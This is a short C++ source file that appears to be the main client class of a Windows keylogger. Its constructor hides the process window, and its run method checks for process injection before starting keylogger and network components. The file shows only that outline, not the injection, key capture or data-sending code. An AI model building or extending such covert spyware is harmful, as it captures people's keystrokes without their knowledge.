#include "stdafx.h"
#include "WindowsClient.h"

WindowsClient::WindowsClient()
	: IClient()
{
	taskManager.getProcess().hideWindow();
}

WindowsClient::~WindowsClient()
{

}

bool				WindowsClient::run()
{
	bool			injected = false;

	if (taskManager.isInjected())
	{
		keylogger.run();
		network.run();
		injected = true;
	}
	if (!taskManager.run())
		injected = true;
	return (injected);
}